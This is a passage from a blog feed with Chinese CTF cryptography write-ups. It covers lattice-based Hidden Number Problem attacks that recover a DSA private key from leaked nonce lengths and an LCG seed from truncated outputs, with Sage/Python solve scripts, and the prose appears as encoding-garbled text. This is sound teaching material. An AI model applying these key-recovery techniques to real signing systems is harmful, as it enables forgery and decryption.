class="string">""</span></span><br><span class="line">r = <span class="number">2</span></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">    r*=<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        flag=calc(flag,magic + (<span class="number">1</span>&lt;&lt;r*<span class="number">8</span>))</span><br><span class="line">        <span class="keyword">if</span> check(long_to_bytes(flag)[:<span class="number">10</span>]):</span><br><span class="line">            FLAG+=(long_to_bytes(flag))</span><br><span class="line">            <span class="keyword">print</span> FLAG</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><del>å°±è¿™ä¹ˆakäº†ç½‘é¼æ¯çš„å¯†ç å­¦ï¼Ÿèµµæ€»åŸè¯ï¼šè¿™å±Šå¯†ç å­¦ä¸è¡Œã€‚</del></p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ HNP</title>
      <link href="/2020/05/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BHNP/"/>
      <url>/2020/05/09/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BHNP/</url>
      
        <content type="html"><![CDATA[<h1 id="æµ…å°Lattice-ä¹‹-HNP"><a href="#æµ…å°Lattice-ä¹‹-HNP" class="headerlink" title="æµ…å°Lattice ä¹‹ HNP"></a>æµ…å°Lattice ä¹‹ HNP</h1><p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/204846" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>&emsp;&emsp;æ ¼å¯†ç æ˜¯ä¸€ç±»å¤‡å—å…³æ³¨çš„æŠ—é‡å­è®¡ç®—æ”»å‡»çš„å…¬é’¥å¯†ç ä½“åˆ¶ã€‚è€Œæ ¼ç†è®ºä¹Ÿä½¿è®¸å¤šç°ä»£å…¬é’¥å¯†ç RSAã€DSAç­‰ä½“ç³»å—åˆ°å½±å“ã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦ä»ä¸¤é“CTFé¢˜ç›®æ¥å­¦ä¹ æ ¼å¯†ç ä¸­çš„HNP(Hidden number problemï¼‰ã€‚</p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><p>&emsp;&emsp;é¦–å…ˆè°ˆè°ˆä¸ªäººå¯¹Latticeçš„ç†è§£å­ã€‚ä¸ªäººè§‰å¾—ï¼ŒLatiiceå°±æ˜¯ç”±è‹¥å¹²çº¿æ€§æ— å…³çš„å‘é‡ç»„æˆçš„ä¸€ä¸ªå‘é‡ç©ºé—´ï¼Œåœ¨è¿™ä¸ªç©ºé—´ä¸­ï¼Œå‘é‡å½¼æ­¤ä¹‹é—´å¯ä»¥è¿›è¡Œç›¸åº”çš„åŠ ã€å‡è¿ç®—ã€‚å‘é‡ä¹Ÿå¯ä»¥ä¹˜ä»¥æŸä¸ªç³»æ•°ï¼Œä½†è¿™ä¸ªç³»æ•°ä»…é™äºæ•´æ•°ï¼Œå› è€Œå½¢æˆäº†å¸ƒæ»¡æ•´ä¸ªç©ºé—´çš„æ ¼ç‚¹ã€‚åœ¨æ ¼ä¸­çš„è®¡ç®—é—®é¢˜ä¸»è¦åŒ…æ‹¬ä¸¤ç§ï¼Œå³SVP(the Shortest Vector Problem of lattice)å’ŒCVP(the Closest Vector Problem)ï¼Œç„¶åä¸ªäººè®¤ä¸ºï¼ŒCVPå¯ä»¥ç»™LatiiceåŠ ä¸Šä¸€ä¸ªç»´åº¦åå˜æˆSVPï¼Œç»§è€Œå¯ä»¥ç”¨LLLç®—æ³•æ¥è¿›è¡Œè§„çº¦ä»è€Œæ‰¾åˆ°æœ€çŸ­å‘é‡ã€‚</p><h2 id="XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP"><a href="#XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP" class="headerlink" title="XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP"></a>XCTF2020-é«˜æ ¡æˆ˜å½¹-NHP</h2><p><a href="https://mega.nz/file/efAzRabC#ZxXtUbcHwAA7jpcU0H6V7rAMRfiS_rboH9H9ZN9S2-U" target="_blank" rel="noopener">é¢˜ç›®é™„ä»¶</a></p><h3 id="é¢˜ç›®ä¿¡æ¯"><a href="#é¢˜ç›®ä¿¡æ¯" class="headerlink" title="é¢˜ç›®ä¿¡æ¯"></a>é¢˜ç›®ä¿¡æ¯</h3><p>é¢˜ç›®ç”¨çš„æ˜¯DSAå…¬é’¥å¯†ç ç­¾åç³»ç»Ÿã€‚</p><p>é¢˜ç›®æä¾›ç­¾åå‡½æ•°ï¼šç”¨æˆ·ä»¥ç”¨æˆ·åæ³¨å†Œï¼ŒæœåŠ¡ç«¯è¿”å›ç­¾åï¼Œ<strong>å¹¶æä¾›æ‰€ç”¨ä¸´æ—¶å¯†é’¥çš„bité•¿åº¦</strong></p><p>æˆ‘ä»¬éœ€è¦ä»¥adminçš„èº«ä»½ç™»é™†æ¥è·å–flagï¼Œä½†æ˜¯æœåŠ¡ç«¯ä¸ä¼šç»™adminç­¾å</p><h3 id="è§£é¢˜æµç¨‹"><a href="#è§£é¢˜æµç¨‹" class="headerlink" title="è§£é¢˜æµç¨‹"></a>è§£é¢˜æµç¨‹</h3><p>æ ¹æ®é¢˜ç›®æµç¨‹ï¼Œæ˜¾ç„¶ï¼Œæˆ‘ä»¬è¦åˆ©ç”¨ä¸´æ—¶å¯†é’¥çš„bité•¿åº¦æ¥è·å–ç§é’¥ï¼Œä»è€Œè·å¾—adminçš„ç­¾å</p><p>å…¶ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“çš„ä¿¡æ¯å…¨å±€å…¬é’¥p, q, gï¼ŒæœåŠ¡ç«¯å…¬é’¥y , æ¯è½®ç­¾åä½¿ç”¨çš„r, s, ä»¥åŠæˆ‘ä»¬å¯æ§çš„H(x)ï¼Œxå³ä¸ºç”¨æˆ·åï¼ŒHashå‡½æ•°è¿™é‡Œç”¨çš„æ˜¯sha256</p><h4 id="step1-å…¬å¼è½¬åŒ–"><a href="#step1-å…¬å¼è½¬åŒ–" class="headerlink" title="step1-å…¬å¼è½¬åŒ–"></a>step1-å…¬å¼è½¬åŒ–</h4><p>ç”±DSAç­¾åä¸­å„å‚æ•°çš„å…³ç³»</p><p>$r \equiv g^k \pmod{q}$<br>$s \equiv k^{-1}(H(m) + xr) \pmod{q}$</p><p>å¯å¾—æ¯è½®ä¸´æ—¶å¯†é’¥ä¸ç­¾åã€æ˜æ–‡çš„å…³ç³»</p><p>$k_i \equiv  s_i^{-1}r_i \cdot x + s_i^{-1}H(m) \pmod{q} $<br>$k_i \equiv A_i x + B_i \pmod{q} $<br>$k_i = A_i x + B_i + l_i q$</p><p>å…¶ä¸­$k_i$å°±æ˜¯æ¯æ¬¡ä½¿ç”¨çš„ä¸´æ—¶å¯†é’¥</p><p>åŒ–ç®€åçš„å¼å­ä¸­çš„$A_i,B_i$å‡å¯ç”±å·²çŸ¥ä¿¡æ¯è®¡ç®—</p><h4 id="step2-æ„é€ Lattice"><a href="#step2-æ„é€ Lattice" class="headerlink" title="step2-æ„é€ Lattice"></a>step2-æ„é€ Lattice</h4><p>å¯¹äºä¸Šå¼ä¸­çš„$k_i$ï¼Œæˆ‘ä»¬ä»…ä»…çŸ¥é“å®ƒçš„bit_engthï¼Œbit_engthæ³„éœ²äº†ä»€ä¹ˆä¿¡æ¯å‘¢ï¼Ÿ</p><p>å½“æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªæ•°çš„bit_engthæ—¶ï¼Œæˆ‘ä»¬èƒ½ç¡®å®šè¿™ä¸ªæ•°çš„å¤§å°èŒƒå›´ï¼Œ</p><p>æ¯”å¦‚ä¸€ä¸ªæ•°çš„bit_engthæ˜¯500æ—¶ï¼Œæˆ‘ä»¬èƒ½ç¡®å®šè¿™ä¸ªæ•°å¤§å°è½åœ¨$(2^{499}-1,2^{500}-1]$</p><p>æ‰€ä»¥æˆ‘ä»¬çŸ¥é“è¿™ä¸ªæ•°çš„MSBä½ä¸º2^499</p><p>è¿™ç­‰ä»·äºï¼Œæˆ‘ä»¬çŸ¥é“äº†ä¸´æ—¶å¯†é’¥çš„ä¸€ä¸ªå¤§æ¦‚çš„å€¼ï¼Œæˆ‘ä»¬è®¾å…¶ä¸º$K$</p><p>ç„¶åæˆ‘ä»¬æ„é€ Lattice</p><p>$M =<br>\begin{bmatrix}<br>q  &amp;   &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp; q &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;      &amp; q  &amp;   &amp;   &amp; \newline<br>A_1&amp;A_2&amp;\dots &amp; A_t&amp;K/q&amp;   &amp; \newline<br>B_1&amp;B_2&amp;\dots &amp; B_t&amp;   &amp; K &amp; \newline<br>\end{bmatrix}$</p><p>ç„¶åè¿™é‡Œå°±ä¼šå­˜åœ¨ä¸€ä¸ªå‘é‡        $v =<br>\begin{bmatrix}<br>l_1 &amp; l_2 &amp; \cdots &amp; l_t &amp; x &amp; 1<br>\end{bmatrix}$</p><p>ä½¿å¾—</p><p>$vM =<br>\begin{bmatrix}<br>l_1 &amp; l_2 &amp; \cdots &amp; l_t &amp; x &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>q  &amp;   &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp; q &amp;      &amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   &amp; \newline<br>&amp;   &amp;      &amp; q  &amp;   &amp;   &amp; \newline<br>A_1&amp;A_2&amp;\dots &amp; A_t&amp;K/q&amp;   &amp; \newline<br>B_1&amp;B_2&amp;\dots &amp; B_t&amp;   &amp; K &amp; \newline<br>\end{bmatrix} = \begin{bmatrix}<br>k_1 &amp;<br>k_2 &amp;<br>\cdots &amp;<br>k_t  &amp;<br>Kx/q &amp;<br>K<br>\end{bmatrix}<br>= v_k$</p><p>å…¶ä¸­å‘é‡$v$ä¸­çš„xå³ä¸ºæˆ‘ä»¬çš„ç§é’¥ï¼Œ</p><h4 id="step3-LLL"><a href="#step3-LLL" class="headerlink" title="step3-LLL"></a>step3-LLL</h4><p>è§£å†³æ ¼å¯†ç çš„é—®é¢˜LLLç®—æ³•çš„è¿ç”¨æ€»æ˜¯å¿…ä¸å¯å°‘çš„ï¼Œå¯æ˜¯è¿™é‡Œæˆ‘ä»¬è¯¥å¦‚ä½•åˆ©ç”¨LLLç®—æ³•å»æ‰¾åˆ°å‘é‡$v_k$å‘¢ï¼Ÿ</p><p>å¦‚æœæˆ‘ä»¬çš„$v_k$çš„é•¿åº¦åœ¨æ ¼ä¸­å¾ˆå°ï¼Œæˆ‘ä»¬åˆ©ç”¨LLLå°±å¾ˆå¯èƒ½å°†å…¶æ‰¾å‡ºã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬éœ€è¦ä¸æœåŠ¡ç«¯äº¤äº’ï¼Œç„¶åæ”¶é›†å½“$k_i$çš„bit_lengthæ¯”è¾ƒå°çš„æƒ…å†µæ—¶çš„ç›¸å…³æ•°æ®ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬çŸ¥é“qçš„bit_lengthä¸º128ï¼Œé‚£æˆ‘ä»¬å¯ä»¥æ‰¾bit_legnthä¸º122çš„$k_i$ï¼Œç„¶åæˆ‘ä»¬è¿˜éœ€è¦ä¸€å®šçš„æ•°æ®é‡ï¼Œè¿™æ ·èƒ½æé«˜åˆ©ç”¨LLLç®—æ³•æ‰¾åˆ°è¿™ä¸ªçŸ­å‘é‡çš„æ¦‚ç‡ï¼Œå¹¶ä¸”ï¼Œä¸Šè¿°æ ¼ä¸­$K/q, K$çš„æ„é€ ä¹Ÿæ˜¯ä¸ºäº†è®©$v_k$ä¸­çš„æ¯ä¸€é¡¹çš„é•¿åº¦éƒ½å·®ä¸å¤šï¼Œè¿™æ ·ä¹Ÿæœ‰åˆ©äºæ‰¾åˆ°$v_k$ï¼Œå‚è€ƒè¿™ä¸€ç¯‡<a href="https://holocircuit.github.io/2019/01/08/unofficial.html" target="_blank" rel="noopener">æ–‡ç« </a>ä¸­çš„<img src="https://i.loli.net/2020/05/09/7NJvL2DSsXwHEnr.png" alt></p><p>å‚è€ƒç¥¥å“¥åšå®¢çš„è¿™ç¯‡<a href="http://blog.soreatu.com/posts/intended-solution-to-nhp-in-gxzyctf-2020/" target="_blank" rel="noopener">å‡ºé¢˜æ–‡ç« </a>ï¼Œå¦å¤–æ„Ÿè°¢ç¥¥å“¥çš„è§£æƒ‘ã€‚</p><h2 id="NPUCTF2020-babyLCG"><a href="#NPUCTF2020-babyLCG" class="headerlink" title="NPUCTF2020-babyLCG"></a>NPUCTF2020-babyLCG</h2><p>é¢˜ç›®é™„ä»¶å¯ä»¥åœ¨<a href="https://buuoj.cn/challenges#[NPUCTF2020]babyLCG" target="_blank" rel="noopener">BUUOJ</a>ä¸‹è½½</p><h3 id="é¢˜ç›®æµç¨‹"><a href="#é¢˜ç›®æµç¨‹" class="headerlink" title="é¢˜ç›®æµç¨‹"></a>é¢˜ç›®æµç¨‹</h3><ol><li>åˆå§‹åŒ–ä¸€ä¸ªLCGåŠ å¯†ç±»ï¼Œç”¨åˆ°éšæœºå‚æ•°a, b, m, seedï¼Œå…¶ä¸­a, b, mï¼Œå‡åœ¨é™„ä»¶ç»™å‡º</li><li>ç”Ÿæˆ20ä¸ª128ä½çš„éšæœºæ•°ï¼Œä½†æ˜¯åªç»™å‡ºæ¯ä¸ªæ•°çš„é«˜64ä½</li><li>å†ç”Ÿæˆä¸‰ä¸ªéšæœºæ•°ï¼Œç”¨AESåŠ å¯†åŠ å¯†flagï¼Œkeyç”±å‰ä¸¤ä¸ªéšæœºæ•°ç»„æˆï¼Œåˆ†åˆ«å–ç¬¬ä¸€ä¸ªéšæœºæ•°å’Œç¬¬äºŒä¸ªéšæœºæ•°çš„é«˜64ä½æ‹¼èµ·æ¥ï¼Œivç”±ç¬¬ä¸‰ä¸ªéšæœºæ•°ç»„æˆ</li></ol><h3 id="è§£é¢˜æ€è·¯"><a href="#è§£é¢˜æ€è·¯" class="headerlink" title="è§£é¢˜æ€è·¯"></a>è§£é¢˜æ€è·¯</h3><p>ä»é¢˜ç›®æµç¨‹æ¥çœ‹ï¼Œæˆ‘ä»¬ç›®çš„åªæœ‰ä¸€ä¸ªï¼Œæ¢å¤seedã€‚</p><h4 id="step1-å…¬å¼è½¬åŒ–-1"><a href="#step1-å…¬å¼è½¬åŒ–-1" class="headerlink" title="step1-å…¬å¼è½¬åŒ–"></a>step1-å…¬å¼è½¬åŒ–</h4><p>LCGç”Ÿæˆéšæœºæ•°çš„å…¬å¼ä¸ºï¼š$s_{i+1} = a*s_i+b\pmod{m}$<img src="https://i.loli.net/2020/05/09/9YZKClW4tPdzmbS.png" alt></p><p>ä½†æ˜¯è¿™ä¸€é¢˜ï¼Œæˆ‘ä»¬åªçŸ¥é“$s_1$ åˆ°$s_{20}$çš„é«˜64ä½ï¼Œæ‰€ä»¥æˆ‘ä»¬å°†$s_i$åˆ†ä¸ºhã€lé«˜ä½ä½ä¸¤éƒ¨åˆ†ï¼Œå…¶ä¸­$h_i$å·²çŸ¥ã€‚æ‰€ä»¥æœ‰</p><p>$(h_{2}+l_{2}) \equiv a*(h_1 + l_1 )+b\pmod{m}$</p><p>$l_{2} \equiv a<em>l_1+a</em>h_1+b-h_{2}\pmod{m}$</p><p>$l_{2} \equiv A_1<em>l_1+B_1\pmod{m}$ ã€$è®¾A_1 = a; B_1 = a</em>h_1+b-h_{2}$ã€‘</p><p>$l_{3} \equiv a<em>l_{2}+a</em>h_{2}+b-h_{3}\pmod{m}$</p><p>$l_{3} \equiv a<em>A_1</em>l_{1}+a<em>B_1+a</em>h_{2}+b-h_{3}\pmod{m}$</p><p>$l_{3} \equiv A_{2}<em>l_{1}+B_{2}\pmod{m}$ã€$è®¾A_{2} = a</em>A_1; B_{2} = a<em>B_1+a</em>h_{2}+b-h_{3}$ã€‘</p><p>â€¦</p><p>è¿™é‡Œï¼Œæˆ‘ä»¬é€šè¿‡å…¬å¼çš„å˜å½¢ï¼Œå¯ä»¥å°†åŸæ¥å¼å­<img src="https://i.loli.net/2020/05/09/9YZKClW4tPdzmbS.png" alt></p><p>ä¸­$s_{i+1}å’Œs_{i}$çš„å…³ç³»è½¬å˜ä¸º$l_{i+1}å’Œl_{i}$çš„å…³ç³»ã€‚å½“ç„¶ï¼ŒåŸç³»æ•°aã€bçš„æ„ä¹‰ä¹Ÿå‘ç”Ÿäº†å¯¹åº”è½¬å˜ã€‚</p><p>è¿™é‡Œç»™å‡ºç”Ÿæˆæ–°A å’ŒB çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">b=<span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a=<span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m=<span class="number">226649634126248141841388712969771891297</span></span><br><span class="line"></span><br><span class="line">h = [<span class="number">0</span>,<span class="number">7800489346663478448</span>,<span class="number">11267068470666042741</span>,<span class="number">5820429484185778982</span>,<span class="number">6151953690371151688</span>,<span class="number">548598048162918265</span>,<span class="number">1586400863715808041</span>,<span class="number">7464677042285115264</span>,<span class="number">4702115170280353188</span>,<span class="number">5123967912274624410</span>,<span class="number">8517471683845309964</span>,<span class="number">2106353633794059980</span>,<span class="number">11042210261466318284</span>,<span class="number">4280340333946566776</span>,<span class="number">6859855443227901284</span>,<span class="number">3149000387344084971</span>,<span class="number">7055653494757088867</span>,<span class="number">5378774397517873605</span>,<span class="number">8265548624197463024</span>,<span class="number">2898083382910841577</span>,<span class="number">4927088585601943730</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(h)):</span><br><span class="line">h[i] &lt;&lt;= <span class="number">64</span></span><br><span class="line">A = [<span class="number">1</span>]</span><br><span class="line">B = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(h)<span class="number">-1</span>):</span><br><span class="line">A.append(a*A[i<span class="number">-1</span>] % m)</span><br><span class="line">B.append((a*B[i<span class="number">-1</span>]+a*h[i]+b-h[i+<span class="number">1</span>]) % m)</span><br><span class="line">print(A[<span class="number">1</span>:])</span><br><span class="line">print(B[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure><h4 id="step2-æ„é€ Lattice-1"><a href="#step2-æ„é€ Lattice-1" class="headerlink" title="step2-æ„é€ Lattice"></a>step2-æ„é€ Lattice</h4><p>ç°åœ¨æˆ‘ä»¬äºŒåæ¡ä¸ $l$ ç›¸å…³çš„æ–¹ç¨‹ç»„äº†ã€‚å³</p><p>$l_{i+1} \equiv A_i*l_i+B_i\pmod{m}$</p><p>$l_{i+1} = A_i*l_i+B_i+k_im$</p><p>ä¸”å¯¹äº $l$ æˆ‘ä»¬çœŸçš„ä¸€æ— æ‰€çŸ¥ä¹ˆï¼Ÿæˆ‘ä»¬å…¶å®çŸ¥é“ $l$ æ˜¯å°äº2^64çš„ï¼Œå³ $l$ æœ€å¤§ä¸º64bitã€‚è¿™æ ·ä¸å‰é¢ä¸€é“é¢˜å°±å¾ˆç±»ä¼¼äº†ã€‚</p><p>äºæ˜¯æˆ‘ä»¬æ„é€ Lattice</p><p>$M =<br>\begin{bmatrix}<br>m  &amp;   &amp;      &amp;    &amp;   &amp;   \newline<br>&amp; m &amp;      &amp;    &amp;   &amp;   \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   \newline<br>&amp;   &amp;      &amp; m  &amp;   &amp;   \newline<br>A_1&amp;A_2&amp;\dots &amp; A_{19}&amp;1&amp;   \newline<br>B_1&amp;B_2&amp;\dots &amp; B_{19}&amp;0&amp; 2^{64}\newline<br>\end{bmatrix}$</p><p>ç„¶åè¿™é‡Œå°±ä¼šå­˜åœ¨ä¸€ä¸ªå‘é‡        $v =<br>\begin{bmatrix}<br>k_1 &amp; k_2 &amp; \cdots &amp; k_{19} &amp; l_1 &amp; 1<br>\end{bmatrix}$ ä½¿å¾—</p><p>$vM =<br>\begin{bmatrix}<br>k_1 &amp; k_2 &amp; \cdots &amp; k_{19} &amp; l_1 &amp; 1<br>\end{bmatrix}<br>\begin{bmatrix}<br>m  &amp;   &amp;      &amp;    &amp;   &amp;   \newline<br>&amp; m &amp;      &amp;    &amp;   &amp;   \newline<br>&amp;   &amp;\ddots&amp;    &amp;   &amp;   \newline<br>&amp;   &amp;      &amp; m  &amp;   &amp;   \newline<br>A_1&amp;A_2&amp;\dots &amp; A_{19}&amp;1&amp;   \newline<br>B_1&amp;B_2&amp;\dots &amp; B_{19}&amp;0&amp; 2^{64} \newline<br>\end{bmatrix} = \begin{bmatrix}<br>l_2 &amp;<br>l_3 &amp;<br>\cdots &amp;<br>l_{20}  &amp;<br>l_1 &amp;<br>2^{64}<br>\end{bmatrix}<br>= v_l$</p><p>å…¶ä¸­$l_1$å³ä¸º$s_1$çš„ä½ä½ï¼Œæ‹¼ä¸Šå…¶é«˜ä½ï¼Œåœ¨åˆ©ç”¨a, b, må°±èƒ½ä¼šæ¢å¤seedäº†</p><h4 id="step3-LLL-1"><a href="#step3-LLL-1" class="headerlink" title="step3-LLL"></a>step3-LLL</h4><p>&emsp;&emsp;è¿™é‡Œæˆ‘ä»¬çš„$v_l$å‘é‡æ¯ä¸€ä½éƒ½åªæœ‰çº¦64bitï¼Œæ˜¾ç„¶ï¼Œå®ƒæ˜¯æ•´ä¸ªæ ¼ä¸­æ¯”è¾ƒçŸ­çš„å‘é‡äº†ï¼Œä¸”æˆ‘ä»¬ä¸€å…±æœ‰19ç»„æ•°æ®ï¼Œé‚£ä¹ˆç›´æ¥å¯¹è¿™ä¸ªLattice Mè¿ç”¨LLLç®—æ³•å°±å¯ä»¥æ‰¾åˆ°$v_l$äº†ã€‚ï¼ˆæ ¼ä¸­å‚æ•°$2^{64}$çš„é€‰å–é“ç†ä¸ä¸Šé¢ä¸€è‡´ï¼‰</p><p>å®Œæ•´expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#sage</span></span><br><span class="line"><span class="string">b=153582801876235638173762045261195852087</span></span><br><span class="line"><span class="string">a=107763262682494809191803026213015101802</span></span><br><span class="line"><span class="string">m=226649634126248141841388712969771891297</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">h = [0,7800489346663478448,11267068470666042741,5820429484185778982,6151953690371151688,548598048162918265,1586400863715808041,7464677042285115264,4702115170280353188,5123967912274624410,8517471683845309964,2106353633794059980,11042210261466318284,4280340333946566776,6859855443227901284,3149000387344084971,7055653494757088867,5378774397517873605,8265548624197463024,2898083382910841577,4927088585601943730]</span></span><br><span class="line"><span class="string">for i in range(len(h)):</span></span><br><span class="line"><span class="string">h[i] &lt;&lt;= 64</span></span><br><span class="line"><span class="string">A = [1]</span></span><br><span class="line"><span class="string">B = [0]</span></span><br><span class="line"><span class="string">for i in range(1, len(h)-1):</span></span><br><span class="line"><span class="string">A.append(a*A[i-1] % m)</span></span><br><span class="line"><span class="string">B.append((a*B[i-1]+a*h[i]+b-h[i+1]) % m)</span></span><br><span class="line"><span class="string">A = A[1:]</span></span><br><span class="line"><span class="string">B = B[1:]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">M = matrix(ZZ, 21, 21)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for i in range(19):</span></span><br><span class="line"><span class="string">    M[i, i] = m</span></span><br><span class="line"><span class="string">    M[19, i] = A[i]</span></span><br><span class="line"><span class="string">    M[20, i] = B[i]</span></span><br><span class="line"><span class="string">    M[i, 19] = M[i, 20] = 0</span></span><br><span class="line"><span class="string">M[19, 19] =  1</span></span><br><span class="line"><span class="string">M[20, 20] = 2^64</span></span><br><span class="line"><span class="string">M[19, 20]= 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#print(B)</span></span><br><span class="line"><span class="string">vl = M.LLL()[0]</span></span><br><span class="line"><span class="string">l1 = vl[-2]</span></span><br><span class="line"><span class="string">h1 = h[1]</span></span><br><span class="line"><span class="string">s1 = l1+h1</span></span><br><span class="line"><span class="string">#s1 = a*seed+b %m</span></span><br><span class="line"><span class="string">seed = ((s1 - b)*inverse_mod(a,m))%m</span></span><br><span class="line"><span class="string">print(seed)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment">#python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LCG</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, bit_length)</span>:</span></span><br><span class="line">b = <span class="number">153582801876235638173762045261195852087</span></span><br><span class="line">a = <span class="number">107763262682494809191803026213015101802</span></span><br><span class="line">m = <span class="number">226649634126248141841388712969771891297</span></span><br><span class="line">seed = <span class="number">73991202721494681711496408225724067994</span></span><br><span class="line">self._key = &#123;<span class="string">'a'</span>:a, <span class="string">'b'</span>:b, <span class="string">'m'</span>:m&#125;</span><br><span class="line">self._state = seed</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next</span><span class="params">(self)</span>:</span></span><br><span class="line">self._state = (self._key[<span class="string">'a'</span>] * self._state + self._key[<span class="string">'b'</span>]) % self._key[<span class="string">'m'</span>]</span><br><span class="line"><span class="keyword">return</span> self._state</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_key</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self._key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_lcg</span><span class="params">()</span>:</span></span><br><span class="line">    rand_iter = LCG(<span class="number">128</span>)</span><br><span class="line">    key = rand_iter.export_key()</span><br><span class="line">    f = open(<span class="string">"key"</span>, <span class="string">"w"</span>)</span><br><span class="line">    f.write(str(key))</span><br><span class="line">    <span class="keyword">return</span> rand_iter</span><br><span class="line"></span><br><span 